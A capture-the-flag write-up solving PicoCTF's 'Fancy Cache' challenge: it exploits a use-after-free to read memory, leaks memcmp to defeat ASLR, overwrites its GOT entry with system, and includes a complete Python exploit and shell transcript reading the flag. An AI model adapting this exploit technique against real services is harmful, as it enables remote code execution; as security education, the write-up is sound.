### Solved by barrebas

Fancy Cache was another "Master Challenge" for PicoCTF worth 200 points. It featured a custom server, which allegedly creates a cache of strings. It's up to us to break it!

We are given the source code, the binary, a libc library and a client written in Python. Wow! `fancy_cache` communicates in a difficult way, but luckily, all the heavy lifting is already done for us in `client.py`! Browsing through fancy_cache.c, we immediately felt that this had to be some kind of use-after-free bug. Indeed, there is a bug in these two functions:

```c
struct cache_entry *cache_lookup(struct string *key) {
  size_t i;
  for (i = 0; i < kCacheSize; ++i) {
    struct cache_entry *entry = &cache[i];

    // Skip expired cache entries.
    if (entry->lifetime == 0) {
      continue;
    }

    if (string_eq(entry->key, key)) {
	   return entry;
    }
  }

  return NULL;
}

void do_cache_get(void) {
  struct string key;
  string_init(&key);
  read_into_string(&key);

  struct cache_entry *entry = cache_lookup(&key);
  if (entry == NULL) {
    write(STDOUT_FILENO, &kNotFound, sizeof(kNotFound));
    return;
  }

  write(STDOUT_FILENO, &kFound, sizeof(kFound));
  write_string(entry->value);

  --entry->lifetime;
  if (entry->lifetime <= 0) {
    // The cache entry is now expired.
    fprintf(stderr, "Destroying key %s\n", entry->key->data);
    string_destroy(entry->key);
    fprintf(stderr, "Destroying value %s\n", entry->value->data);
    string_destroy(entry->value);
  }
}
```

The function `do_cache_get` will free a string struct when the lifetime goes below zero, but `cache_lookup` will happily return entries with a negative lifetime. That means we can free a string struct, *somehow* write to it, and influence the cache entries! After calls to `free()`, subsequent calls to `malloc()` will usually return recently freed memory. For instance, consider this sequence:

```bash
# start our server
bas@tritonal:~/tmp/picoctf/fancy_cache$ socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./fancy_cache
```

And modify the client.py script a bit:

```python
# Add an entry with a negative lifetime. This will fool cache_lookup.
cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)

# Request that value, causing it to be deleted from cache
print cache_get(f, 'keyAAAA')

# Now request the value of 'bleh'
print cache_get(f, 'bleh')
```

This results in the following debug output of the local server:

```bash
malloc(12) = 0x8598008 (string_create)
realloc((nil), 7) = 0x8598018 (read_into_string)
malloc(12) = 0x8598028 (string_create)
realloc((nil), 8) = 0x8598038 (read_into_string)
realloc((nil), 7) = 0x8598048 (read_into_string)
Destroying key
free(0x8598008) (string_destroy str)
Destroying value
free(0x8598028) (string_destroy str)
realloc((nil), 4) = 0x8598028 (read_into_string)
```

At first, the code allocates `0x8598008` and `0x8598028` as `key` and `value` string structs, respectively. Then, we request the value of 'keyAAAA', causing do_cache_get to free that memory again. Next, we request the value of the non-existent key 'bleh'. However, the program allocates space at `0x8598028`, the recently freed region! Because the cache entry is still valid (lifetime != 0), we can write a new string struct to these locations! Let's first try to read memory. There is a hint hidden on the remote server, waiting for us. In the local copy, it just says `REDACTED`. In order for this work, cache->key->data must point to a real string. I choose 'printf' in the binary. So:

-	We register a struct string with lifetime -1. 
-	We fetch it; the struct string will be freed, but the cache_lookup() function will still try to use it, because lifetime != 0
-	We try to request another string struct, but this will allocate the old memory location and overwrite the old alloc’ed key & value regions (still valid according to cache_lookup()!). 
-	We “write” a string struct into value:
```bash
	old_value->length = 0xff
	old_value->capacity = 0x00
	old_value->data = pointer to whatever we want to read
```
-	We write a string struct into key:

```bash
old_key->length = 0x6
old_key->cap = 0x00
old_key->data = pointer to string that is known, like printf ->      0x8048310
```
We need that known string (printf was chosen arbitrarily) because we need the following piece of code to evaluate to true:

```c
    if (string_eq(entry->key, key)) {
	   return entry;
    }
```

- We request the key called 'printf'; the cache_lookup will succeed, and it will give us the memory that is stored at old_value->data, which is supplied by us!

```python
### modifications to client.py:

# Add an entry to the cache
assert cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)
# Delete from cache
print cache_get(f, 'keyAAAA')
# This is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)). 
print cache_get(f, '\xff\x00\x00\x00\x00\x00\x00\x00\xc9\x8b\x04\x08')
# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
# We supply the address of 'printf', so the check will pass & we read whatever is at value->data
print cache_get(f, '\x06\x00\x00\x00\x06\x00\x00\x00\x10\x83\x04\x08')
# Print the actual data!
print cache_get(f, 'printf')
```

This gives the following output locally:

```bash
bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
AAAA____
None
None
REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED RED
```

And for the remote server:

```bash
bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 

AAAA____
None
None
ongratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shel
```

Aha! Hints! Actually, that page spells out exactly what we need to do. I decided to follow it, also because of the very specific mention of the address of `memcmp`, which we need to defeat ASLR. Using the same read memory trick, we grab the address of `memcmp`, which is stored at `0x804b014`. Using this address, we can calculate system by subtracting 0x142870 and adding 0x40100, the address of system in the supplied libc.so.6. Then, we need to write that value to `0x804b014` by doing a cache_set call. Finally, we need to trigger `memcmp`, which now actually calls `system`. Oof! This turned out to be less-than-trivial, mostly because of differences in the address of memcmp on my local box. Finally, I worked out the following script (hopefully with enough comments to make sense of what's going on):

```python
#!/usr/bin/python
import struct
import socket
import telnetlib

def pack4(v):
    """
    Takes a 32 bit integer and returns a 4 byte string representing the
    number in little endian.
    """
    assert 0 <= v <= 0xffffffff
    # The < is for little endian, the I is for a 4 byte unsigned int.
    # See https://docs.python.org/2/library/struct.html for more info.
    return struct.pack('<I', v)

def unpack4(v):
    """Does the opposite of pack4."""
    assert len(v) == 4
    return struct.unpack('<I', v)[0]

CACHE_GET = 0
CACHE_SET = 1

kNotFound = 0x0
kFound = 0x1
kCacheFull = 0x2

def write_string(f, s):
    f.write(pack4(len(s)))
    f.write(s)

def read_string(f):
    size = unpack4(f.read(4))
    return f.read(size)

def cache_get(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kNotFound:
        return None
    assert status == kFound

    return read_string(f)

# We need this modified function, because once we hit system('/bin/sh'),
# there will be no more data sent back in the way that the original 
# function expects. This causes it to b0rk.
def cache_get2(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)
   
def cache_set(f, key, value, lifetime):
    f.write(chr(CACHE_SET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kCacheFull:
        return False
    assert status == kFound

    write_string(f, value)
    f.write(pack4(lifetime))
    return True

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('vuln2014.picoctf.com', 4548))
f = s.makefile('rw', bufsize=0)

# Command to be executed later, once we've overwritten memcmp@plt.
cmd = '/bin/sh\x00'

# Add an entry to the cache; we will use this command later to spawn the shell. 
cache_set(f, cmd, "payload", 1000)

# Add an entry with a negative lifetime. This will fool cache_lookup, because it only checks for zero:
'''
    // Skip expired cache entries.
    if (entry->lifetime == 0) {
      continue;
    }
'''
cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)

# Request that value, causing it to be deleted from cache
print cache_get(f, 'keyAAAA')

'''
// This is how the string struct looks like:
struct string {
  size_t length;
  size_t capacity;
  char *data;
};
'''
# Now, we request the value of a key called '\x04\x00\x00\x00\x00\x00\x00\..."
# but this is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)),
# because malloc will re-use this address.
# Leak memcmp address @ 0x804b014
cache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))

# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
# We supply the address of 'printf', so the check will pass & we read whatever is at value->data
cache_get(f, pack4(6)+pack4(6)+pack4(0x8048310))

# Grab memcmp address:
addr_memcmp = unpack4(cache_get(f, 'printf'))
print "[+] Leaking memcmp address: {}".format(hex(addr_memcmp))

# Calculate system address:
addr_system = addr_memcmp - 0x142870 + 0x40100 
print "[+] Calculated system address: {}".format(hex(addr_system))

# Now we have to overwrite memcmp @ 0x804b014. The hints say we can do this with cache_set. 
# We'd love to abuse our old cache entry again, but alas, the memory regions have again been 
# freed(), due to cache_get seeing a lifetime <= 0.
# We'll restore them, so we can abuse them again to write to 0x804b014.

cache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))
cache_get(f, pack4(6)+pack4(0)+pack4(0x8048310))

print "[+] Attempting to overwrite memcmp pointer..."
assert cache_set(f, 'printf', pack4(addr_system), 1)

print "[+] Running {} on remote box".format(cmd)
print cache_get2(f, cmd)

# Once you get the service to run a shell, this lets you send commands
# to the shell and get the results back :-)

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Running it lands us a shell!

```bash
bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
AAAA____
[+] Leaking memcmp address: 0xf7686870
[+] Calculated system address: 0xf7584100
[+] Attempting to overwrite memcmp pointer...
[+] Running /bin/sh on remote box
None
id
uid=1009(fancy_cache) gid=1009(fancy_cache) groups=1009(fancy_cache)
ls /home/ 
bleichenbacher
easyoverflow
ecb
fancy_cache
guess
hardcore_owner
lowentropy
netsino
policerecords
ubuntu
ls /home/fancy_cache
fancy_cache
fancy_cache.sh
flag.txt
cat /home/fancy_cache/flag.txt
that_wasnt_so_free_after_all
```

The flag is `that_wasnt_so_free_after_all`. Fancy indeed!
